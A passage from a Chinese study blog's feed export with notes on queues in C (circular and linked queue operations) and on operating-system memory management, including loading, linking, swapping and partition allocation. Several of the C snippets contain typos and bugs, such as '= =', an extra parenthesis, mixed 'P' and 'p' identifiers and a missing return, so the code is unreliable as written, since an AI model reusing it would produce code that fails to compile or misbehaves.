function_">DeQueue</span><span class="hljs-params">(SqQueue &amp;Q, QElemType &amp;e)</span>&#123;<br>   <span class="hljs-keyword">if</span> (Q.front == Q.rear) <span class="hljs-keyword">return</span> ERROR;<span class="hljs-comment">//队空</span><br>   e = Q.base[Q.front];  <span class="hljs-comment">//保存队头元素 </span><br>   Q.front = (Q.front + <span class="hljs-number">1</span>) % MAXQSIZE; <span class="hljs-comment">//队头指针加1</span><br>   <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="取队头元素">6. 取队头元素</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">SElemType <span class="hljs-title function_">GetHead</span><span class="hljs-params">(SqQuere Q)</span>&#123; <span class="hljs-comment">//建议SElemType直接改成int</span><br>    <span class="hljs-keyword">if</span>(Q.front!=Q.rear) <span class="hljs-comment">//队列不为空</span><br>        <span class="hljs-keyword">return</span> Q.base[Q.front]; <span class="hljs-comment">//返回队头指针元素的值，队头指针不变</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="队列的链式表示和实现">3.5.3 队列的链式表示和实现</h2><p>若用户无法估计所用队列的长度，则宜采用链队列</p><p>队列的链式存储结构表示为链队列，它实际上是一个同时带有队头指针和队尾指针的单链表，只不过它只能尾进头出而已。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241617105.png"alt="链队列" /><figcaption aria-hidden="true">链队列</figcaption></figure><p>空队列时，front和real都指向头结点。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241618820.png"alt="链队列为空时" /><figcaption aria-hidden="true">链队列为空时</figcaption></figure><h3 id="链队列的类型定义">1. 链队列的类型定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXQSIZE 100 <span class="hljs-comment">//最大队列长度</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Qnode</span> &#123;</span><br>    QElemType data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Qnode</span> *<span class="hljs-title">next</span>;</span><br>&#125;QNode,*QuenePtr; <span class="hljs-comment">//ptr：pointer</span><br><span class="hljs-comment">//QNode 表示 struct Qnode，QuenePtr 表示指向 struct Qnode 的指针。</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    QueuePtr front; <span class="hljs-comment">// 队头指针</span><br>    QueuePtr rear; <span class="hljs-comment">//队尾指针</span><br>&#125; LinkQueue; <br></code></pre></td></tr></table></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241624725.png"alt="链队列运算指针变化状况" /><figcaption aria-hidden="true">链队列运算指针变化状况</figcaption></figure><h3 id="链队列初始化">2. 链队列初始化</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241645602.png"alt="链队列初始化" /><figcaption aria-hidden="true">链队列初始化</figcaption></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//构造一个空队列</span><br>Status <span class="hljs-title function_">InitQueue</span><span class="hljs-params">(LinkQueue &amp;Q)</span>&#123;<br>    Q.front = Q.rear = (QueuePtr)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Qnode)); <span class="hljs-comment">//?</span><br>    <span class="hljs-keyword">if</span> (!Q.front) <span class="hljs-built_in">exit</span>(OVERFLOW));<br>    Q.front-&gt;next=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>解释一下<code>Q.front = Q.rear = (QueuePtr)malloc(sizeof(Qnode));</code></p><p>这行代码的效果是创建了一个包含一个节点的链式队列，并将队列的前端和尾端指针都指向这个节点。</p><p>sizeof(Qnode)：这里使用 sizeof 运算符来获取 Qnode结构体的大小，单位是字节。sizeof(Qnode) 返回的是 Qnode结构体所占用的内存大小。</p><p>malloc(sizeof(Qnode))：malloc函数用于动态分配内存。它接受一个参数，即要分配的字节数，然后返回一个指向新分配内存区域起始位置的指针。在这里，malloc(sizeof(Qnode))分配了足够大小的内存以容纳一个 Qnode结构体，并返回一个指向这块内存的指针。</p><p>(QueuePtr)：这是类型转换操作符，将前面 malloc 返回的指针转换为QueuePtr 类型。这是为了保证类型匹配，因为 malloc 返回的是<code>void*</code> 类型的指针，而 QueuePtr 是指向 struct Qnode的指针类型。</p><p><code>Q.front = Q.rear = (QueuePtr)malloc(sizeof(Qnode));</code>：这行代码将刚刚分配的内存地址赋给<code>Q.front</code> 和Q.rear。这两个指针都指向同一个新分配的节点，这也表示队列目前只有这一个节点。</p><p>这个节点的 data 成员和 next 成员的值在这个时候尚未初始化。</p></blockquote><h3 id="销毁链队列">3. 销毁链队列</h3><p>算法思想：从队头结点开始，依次释放所有结点</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//销毁队列Q</span><br>Status <span class="hljs-title function_">DestroyQueue</span><span class="hljs-params">(LinkQueue &amp;Q)</span>&#123;<br>    <span class="hljs-keyword">while</span> (Q.front)&#123;<br>        p = Q.front-&gt;next; <span class="hljs-comment">//或者p用Q.rear</span><br>        <span class="hljs-built_in">free</span>(Q.front);<br>        Q.front = p;<br>    &#125;<br>    <span class="hljs-keyword">return</span> OK;<br> &#125;<br><br></code></pre></td></tr></table></figure><h3 id="链队列的入队">4. 链队列的入队</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241646384.png"alt="链队列的入队" /><figcaption aria-hidden="true">链队列的入队</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//插入元素e为Q的队尾元素(入队)</span><br><span class="hljs-function">Status <span class="hljs-title">EnQueue</span><span class="hljs-params">(LinkQueue &amp;Q, QElemType e)</span></span>&#123;<br>    p = (QueuePtr)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(Qnode));<br>    <span class="hljs-keyword">if</span> (!p) <span class="hljs-built_in">exit</span>(OVERFLOW);<br>    p-&gt;data=e;<br>    p-&gt;next=<span class="hljs-literal">NULL</span>;<br>    <br>   Q.rear-&gt;next = p;  <span class="hljs-comment">//将新结点接在尾部</span><br>   Q.rear = p;  <span class="hljs-comment">//把当前的p设置为新的队尾结点</span><br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链队列的出队">5. 链队列的出队</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312241650380.png"alt="链队列的出队" /><figcaption aria-hidden="true">链队列的出队</figcaption></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//删除Q的队头元素(出队)</span><br>Status <span class="hljs-title function_">DeQueue</span><span class="hljs-params">(LinkQueue &amp;Q, QElemType &amp;e)</span>&#123;<br>    <span class="hljs-keyword">if</span> (Q.front= =Q.rear) <span class="hljs-keyword">return</span> ERROR;<br>   p = Q.front-&gt;next;<br>    e = p-&gt;data;<br>    Q.front-&gt;next = p-&gt;next;<br>    <br>   <span class="hljs-keyword">if</span> (Q.rear == P)  Q.rear=Q.front;<br>    <br>    <span class="hljs-built_in">free</span>(P); <br>   <span class="hljs-keyword">return</span> OK;<br> &#125;<br><br></code></pre></td></tr></table></figure><h3 id="求链队列的队头元素">6. 求链队列的队头元素</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Status <span class="hljs-title function_">GetHead</span> <span class="hljs-params">(LinkQueue Q QElemType &amp;e)</span>&#123;<br>    <span class="hljs-keyword">if</span>(Q.front==Qrear) <span class="hljs-keyword">return</span> ERROR;<br>    e = Q.front-&gt;next-&gt;data;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>参考：</p><p><ahref="https://baijiahao.baidu.com/s?id=1765844865764481827&amp;wfr=spider&amp;for=pc">节点和结点有什么区别？(baidu.com)</a></p><p><ahref="https://blog.csdn.net/Real_Fool_/article/details/113852222">数据结构：栈和队列(Stack&amp; Queue)【详解】-CSDN博客</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>数据结构</category>
      
    </categories>
    
    
    <tags>
      
      <tag>数据结构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统 3 内存管理</title>
    <link href="/2023/12/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%203%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"/>
    <url>/2023/12/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%203%20%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/</url>
    
    <content type="html"><![CDATA[<blockquote><p>王道操作系统3.1_6，3.1_7，3.1_8，3.1_9，3.1_10，3.1_11待补充</p></blockquote><blockquote><p>学的时候发现王道考研这样说的是内存管理，而📕上的是存储器管理</p><p>导致笨🐭有点疑惑，所以就去搜了一下，搜到了一点资料，解答了这个疑惑，或者看一下补充的3.1.0</p><p>其实就一句话：内存又叫内部存储器（不知道这样理解对不对</p><p>其实就是计组里面的知识</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312192202767.jpeg"alt="计算机存储系统（易懂版）" /><figcaption aria-hidden="true">计算机存储系统（易懂版）</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312192205771.png"alt="计算机系统的组成" /><figcaption aria-hidden="true">计算机系统的组成</figcaption></figure></blockquote><h1 id="内存管理">3.1 内存管理</h1><h2 id="存储器的层次结构">3.1.0 存储器的层次结构</h2><ul><li>几乎每条指令都涉及对存储器的访问</li><li>要求对存储器的访问速度能跟得上处理机运行速度</li><li>还要求存储器具有非常大的容量，并且价格便宜</li></ul><h3 id="多层结构的存储器系统">1. 多层结构的存储器系统</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312192210636.png"alt="计算机存储系统（官方版）" /><figcaption aria-hidden="true">计算机存储系统（官方版）</figcaption></figure><h3 id="可执行存储器">2. 可执行存储器</h3><ul><li>寄存器和主存储器又被称为可执行存储器</li><li>访问可执行存储器中的信息较快<ul><li>访问寄存器or高速缓存：几十ns</li><li>访问主存：几百ns</li></ul></li><li>访问辅存中的信息较慢，需要I/O操作<ul><li>访问辅存：几十到几百ms</li></ul></li><li>访问机制不同<ul><li>可执行存储器：寄存器读取；内存寻址；数据总线</li><li>辅存：机械操作；I/O操作</li></ul></li></ul><h3 id="主存储器与寄存器">3. 主存储器与寄存器</h3><ol type="1"><li>主存储器</li></ol><p>主存储器简称内存或主存，用于<strong>保存进程运行时的程序和数据</strong>（这里™的又把主存储器给简称为内存了，测！</p><ol start="2" type="1"><li>寄存器</li></ol><p>寄存器具有与CPU相同的速度；故对寄存器的访问速度最快，但价格却十分昂贵，因此容量非常小</p><p>E.g.，Intel 8086 CPU有14个寄存器,<code>AX, BX, CX, DX, SP, BP, SI, DI, IP, FLAG, CS, DS, SS, ES</code></p><h3 id="高速缓存和磁盘缓存">4. 高速缓存和磁盘缓存</h3><ol type="1"><li>高速缓存</li></ol><ul><li><p>是介于寄存器和存储器之间的存储器，用于备份主存中较常用的数据，以减少处理机对主存储器的访问次数；大幅提高程序执行速度</p></li><li><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312192216159.png"alt="高速缓存" /><figcaption aria-hidden="true">高速缓存</figcaption></figure></li></ul><ol start="2" type="1"><li>磁盘缓存</li></ol><ul><li><p>为了缓和磁盘和内存在访问速度上的不匹配而设置了磁盘缓存</p></li><li><p>用于暂时存放频繁使用的一部分磁盘数据和信息，以减少访问磁盘的次数</p></li><li><p><strong>注意</strong>：磁盘缓存与高速缓存不同，它本身并不是一种实际存在的存储器，而是利用主存中的部分存储空间暂时存放从磁盘中读出(或写入)的信息</p></li></ul><h2 id="内存的基础知识">3.1.1 内存的基础知识</h2><h3 id="一些小知识">1. 一些小知识</h3><p>什么是内存，有何作用：</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312152153892.png"alt="内存" /><figcaption aria-hidden="true">内存</figcaption></figure><p>补充知识：几个常用的数量单位</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191144856.png"alt="几个常用的数量单位" /><figcaption aria-hidden="true">几个常用的数量单位</figcaption></figure><h4 id="相对地址-v-绝对地址">相对地址 v 绝对地址</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191206478.png"alt="相对地址vs绝对地址" /><figcaption aria-hidden="true">相对地址vs绝对地址</figcaption></figure><h4 id="从写程序到程序运行">从写程序到程序运行</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191159491.png"alt="编译、链接、装入" /><figcaption aria-hidden="true">编译、链接、装入</figcaption></figure><p>不修改装入模块中的指令地址就直接装入内存的话：</p><p>如果内存地址不是从0开始，那么就会出现错误</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191202515.png"alt="指令的工作原理" /><figcaption aria-hidden="true">指令的工作原理</figcaption></figure><p>装入模块装入内存时需要对指令中的地址进行处理，</p><p>下面介绍的装入的三种方式就是用三种不同的方法完成<strong>逻辑地址到物理地址</strong>的转换</p><h3 id="程序的装入-三种方式">2. 程序的装入-三种方式</h3><h4 id="绝对装入">绝对装入</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191153718.png"alt="绝对装入" /><figcaption aria-hidden="true">绝对装入</figcaption></figure><ul><li>早期计算机系统很小，仅能运行单道程序；完全有可能知道程序将驻留在内存的什么位置(地址)</li><li>此时可以采用绝对装入方式。用户程序经编译后，将产生绝对地址(即物理地址)的目标代码</li><li><strong>缺点</strong>：程序员要非常熟悉当前内存情况；程序发生修改时，必须修改程序中所有的绝对地址</li></ul><h4 id="可重定位装入">可重定位装入</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191210568.png"alt="image-20231219121050471" /><figcaption aria-hidden="true">image-20231219121050471</figcaption></figure><p>只适用于单道程序环境，在多道程序环境下，编译程序不可能预知经编译后所得到的目标模块应放在内存的何处</p><h4 id="动态运行时装入">动态运行时装入</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191213337.png"alt="动态运行时装入" /><figcaption aria-hidden="true">动态运行时装入</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191214221.png"alt="动态运行时装入" /><figcaption aria-hidden="true">动态运行时装入</figcaption></figure><ul><li>可将程序分配到不连续的存储区中；</li><li>在程序运行前只需装入它的部分代码即可投入运行，然后在程序运行期间，根据需要动态申请分配内存</li><li>便于程序段的共享，可以向用户提供一个比存储空间大得多的地址空间</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191645271.png"alt="三种装入方式" /><figcaption aria-hidden="true">三种装入方式</figcaption></figure><h3 id="程序的链接-三种方式">3. 程序的链接-三种方式</h3><h4 id="静态链接">静态链接</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191622970.png"alt="静态链接" /><figcaption aria-hidden="true">静态链接</figcaption></figure><p>装配成可执行程序时要解决：</p><ol type="1"><li><p>对相对地址进行修改</p></li><li><p>变换外部调用符号</p></li></ol><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191626954.png"alt="静态链接" /><figcaption aria-hidden="true">静态链接</figcaption></figure><p>#### 装入时动态链接</p><blockquote><p>所有的模块都装入内存</p></blockquote><p>是指在将一组目标模块装入内存时，采用边装入边链接的方式，然后再按照上图所示的方式来修改目标模块中的相对地址。</p><p>在装入时，若发生一个外部模块调用事件，则找出相应的外部目标模块并将其装入内存</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191631461.png"alt="装入时动态链接" /><figcaption aria-hidden="true">装入时动态链接</figcaption></figure><p><strong>优点</strong>：</p><ol type="1"><li><p>便于修改和更新。对于经静态链接装配在一起的装入模块，如果要修改或更新其中的某个目标模块，则要求重新打开装入模块。这不仅是低效的，而且有时是不可能的。若采用动态链接方式，由于各目标模块是分开存放的，所以要修改或更新各目标模块是件非常容易的事。</p></li><li><p>便于实现对目标模块的共享。在采用静态链接方式时，每个应用模块都必须含有其目标模块的拷贝，无法实现对目标模块的共享。但采用装入时动态链接方式，OS则很容易将一个目标模块链接到几个应用模块上，实现多个应用程序对该模块的共享。</p></li></ol><p><strong>缺点</strong>：</p><ol type="1"><li><p>有的模块在运行时没有被调用；浪费了内存</p></li><li><p>装入时间开销相对较大</p></li></ol><h4 id="运行时动态链接">运行时动态链接</h4><blockquote><p>需要某个模块时才装入内存</p></blockquote><p>在程序执行中需要该目标模块时，才对它进行链接。</p><ul><li>克服了装入时动态链接方式的缺点</li><li>仅在程序运行时需要调用相关模块时才将那些模块进行动态链接</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191634462.png"alt="运行时动态链接" /><figcaption aria-hidden="true">运行时动态链接</figcaption></figure><h2 id="内存管理的概念">3.1.2 内存管理的概念</h2><h3 id="内存管理管些什么">内存管理管些什么</h3><ul><li>操作系统负责内存空间的分配与回收</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191638056.png"alt="内存空间的分配与回收" /><figcaption aria-hidden="true">内存空间的分配与回收</figcaption></figure><ul><li>操作系统需要提供某种技术从逻辑上对内存空间进行扩充</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191641727.png"alt="内存空间的拓展" /><figcaption aria-hidden="true">内存空间的拓展</figcaption></figure><ul><li>操作系统需要提供地址转换功能，负责程序的逻辑地址与物理地址的转换</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191642704.png"alt="地址转换" /><figcaption aria-hidden="true">地址转换</figcaption></figure><ul><li>操作系统需要提供内存保护功能。保证各进程在各自存储空间内运行，互不干扰</li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191647331.png"alt="内存保护" /><figcaption aria-hidden="true">内存保护</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191648587.png"alt="内存保护" /><figcaption aria-hidden="true">内存保护</figcaption></figure><blockquote><p>这节主要是对内存管理有一个大体的框架</p></blockquote><h2 id="覆盖技术与交换技术">3.1.3 覆盖技术与交换技术</h2><blockquote><p>理解思想即可</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191652903.png"alt="内存管理的概念" /><figcaption aria-hidden="true">内存管理的概念</figcaption></figure><h3 id="覆盖技术">1. 覆盖技术</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191657305.png"alt="覆盖技术" /><figcaption aria-hidden="true">覆盖技术</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191659190.png"alt="覆盖技术" /><figcaption aria-hidden="true">覆盖技术</figcaption></figure><p>B，C不可能在同一个时间段被访问，覆盖区以B和C中较大的来计算</p><p>D，E，F也不能在同一个时间段来访问</p><h3 id="交换技术">2. 交换技术</h3><blockquote><p>中级调度就是为了实现交换技术</p></blockquote><p>对换(Swapping)</p><ul><li><p>也称为交换技术；最早用于麻省理工学院的单用户分时系统CTSS中</p></li><li><p>当时计算机内存非常小，为了使该系统能分时运行多个用户程序，把所有的用户作业存放在磁盘上，每次只能调入一个作业进入内存</p></li><li><p>当该作业的一个时间片用完时，将它调至外存的后备队列上等待，再从后备队列上将另一个作业调入内存</p></li></ul><h4 id="多道程序环境下的对换技术">多道程序环境下的对换技术</h4><ol type="1"><li>对换的引入</li></ol><ul><li><p>在内存中的某些进程由于阻塞而停止运行，但却占用了大量的内存空间，甚至有时可能内存中所有进程都被阻塞，而无可运行之进程，迫使CPU停止下来空等</p></li><li><p>另一方面，可能又有许多作业因内存空间不足，一直驻留在外存上而不能进入内存运行。显然这对系统资源是一种严重的浪费，且使系统吞吐量下降</p></li></ul><ol start="2" type="1"><li>对换的类型</li></ol><ul><li>在每次对换时，将一定数量的程序或数据换入或换出内存。根据每次对换时所对换的数量，可将对换分为：<ul><li>整体对换：将整个进程换入、换出</li><li>页面(分段)对换：以进程的“页面”或者“段”为单位进行换入、换出</li></ul></li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191702389.png"alt="交换技术" /><figcaption aria-hidden="true">交换技术</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191703570.png"alt="回忆一下、" /><figcaption aria-hidden="true">回忆一下、</figcaption></figure><p>有关交换技术的一些问题</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191707656.png"alt="交换技术" /><figcaption aria-hidden="true">交换技术</figcaption></figure><p><strong>对换区空闲盘块管理中的数据结构</strong></p><ul><li><p>为了实现对对换区中的空闲盘块的管理，在系统中有<strong>对换进程</strong>，同时应配置相应的数据结构，用于记录外存对换区中的空闲盘块的使用情况</p></li><li><p>其数据结构的形式与内存在动态分区分配方式中所用数据结构相似，即同样可以用空闲分区表或空闲分区链</p></li><li><p>在空闲分区表的每个表目中，应包含两项：对换区的首址及其大小，分别用盘块号和盘块数表示</p></li></ul><p><strong>对换空间的分配与回收</strong></p><ul><li><p>由于对换分区的分配采用的是连续分配方式，因而对换空间的分配与回收与动态分区方式时的内存分配与回收方法雷同</p></li><li><p>其分配算法可以是首次适应算法、循环首次适应算法或最佳适应算法等。具体的分配操作也与图4-8中内存的分配过程相同</p></li></ul><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312192233654.png"alt="内存分配流程" /><figcaption aria-hidden="true">内存分配流程</figcaption></figure><p><strong>进程的换出</strong></p><p>对换进程在实现进程换出时，是将内存中的某些进程调出至<strong>对换区</strong>，腾出内存空间。换出过程可分为：</p><ol type="1"><li>选择被换出的进程</li></ol><p>原则：选阻塞/睡眠进程、优先级低的进程</p><ol start="2" type="1"><li>进程换出过程</li></ol><p>原则：换出没有共享程序段/数据段的进程</p><p><strong>进程的换入</strong></p><ul><li><p>对换进程将定时执行换入操作，首先查看PCB集合中所有进程的状态，从中找出“就绪”状态但已换出的进程</p></li><li><p>当有许多这样的进程时，它将选择其中已换出到磁盘上时间最久的进程作为换入进程</p></li><li><p>为该进程申请内存，如申请成功，可直接将进程从外存调入内存；如失败，则需先将内存中的某些进程换出，腾出足够的内存空间后，再将磁盘上的进程调入</p></li><li><p>反复换入进程，直到无进程可换入</p></li></ul><h2 id="连续分配存储管理方式">3.1.4 连续分配存储管理方式</h2><blockquote><p>内存管理下面的三个作用已经讲过了，这节课我们来看连续分配管理方式</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191709113.png"alt="1702976962451" /><figcaption aria-hidden="true">1702976962451</figcaption></figure><h3 id="单一连续分配">1. 单一连续分配</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191713178.png"alt="单一连续分配" /><figcaption aria-hidden="true">单一连续分配</figcaption></figure><h3 id="固定分区分配">2. 固定分区分配</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191717812.png"alt="固定分区分配" /><figcaption aria-hidden="true">固定分区分配</figcaption></figure><p>操作系统应该怎么记录内存当中各个分区空闲或者分配的情况呢？</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191720152.png"alt="分区说明表" /><figcaption aria-hidden="true">分区说明表</figcaption></figure><h3 id="动态分区分配">3. 动态分区分配</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191722334.png"alt="动态分区分配" /><figcaption aria-hidden="true">动态分区分配</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191723022.png"alt="分区分配的选择怎么做" /><figcaption aria-hidden="true">分区分配的选择怎么做</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191723348.png"alt="分区的分配与回收怎么做" /><figcaption aria-hidden="true">分区的分配与回收怎么做</figcaption></figure><h4 id="动态分区分配中的数据结构">1 动态分区分配中的数据结构</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191728955.png"alt="动态分区分配中的数据结构" /><figcaption aria-hidden="true">动态分区分配中的数据结构</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191729048.png"alt="空闲链表结构" /><figcaption aria-hidden="true">空闲链表结构</figcaption></figure><h4 id="分区分配算法">2 分区分配算法</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191730284.png"alt="分区分配的选择怎么做" /><figcaption aria-hidden="true">分区分配的选择怎么做</figcaption></figure><h4 id="如何分配">3 如何分配</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191732614.png"alt="如何分配" /><figcaption aria-hidden="true">如何分配</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191733467.png"alt="如何分配" /><figcaption aria-hidden="true">如何分配</figcaption></figure><p>如果分配的进程大小和分区大小刚好相，就删除分区对应的表项，空闲分区链的话就把一个节点给删除</p><h4 id="如何回收">4 如何回收</h4><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191742663.png"alt="如何回收1" /><figcaption aria-hidden="true">如何回收1</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191743971.png"alt="如何回收2" /><figcaption aria-hidden="true">如何回收2</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191743965.png"alt="如何回收3" /><figcaption aria-hidden="true">如何回收3</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191744348.png"alt="如何回收4" /><figcaption aria-hidden="true">如何回收4</figcaption></figure><h3 id="内部碎片与外部碎片">4. 内部碎片与外部碎片</h3><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312191749148.png"alt="内部碎片与外部碎片" /><figcaption aria-hidden="true">内部碎片与外部碎片</figcaption></figure><p><strong>可以通过紧凑（拼凑，Compaction）技术来解决外部碎片</strong></p><h2 id="动态分区分配算法">3.1.5 动态分区分配算法</h2><blockquote><p>下面应该说是考研要求掌握的四种算法</p></blockquote><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312192044586.png"alt="1702989875184" /><figcaption aria-hidden="true">1702989875184</figcaption></figure><h3 id="首次适应first-fitff算法">首次适应(first fit，FF)算法</h3><p>算法思想：每次都从低地址开始查找，找到第一个能满足大小的空闲分区。</p><p>如何实现：空闲分区以地址递增的次序排列。每次分配内存时顺序查找空闲分区链(或空闲分区表)，找到大小能满足要求的第一个空闲分区。</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312192047480.png"alt="首次适应算法" /><figcaption aria-hidden="true">首次适应算法</figcaption></figure><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202312192048101.png"alt="首次适应算法" /><figcaption 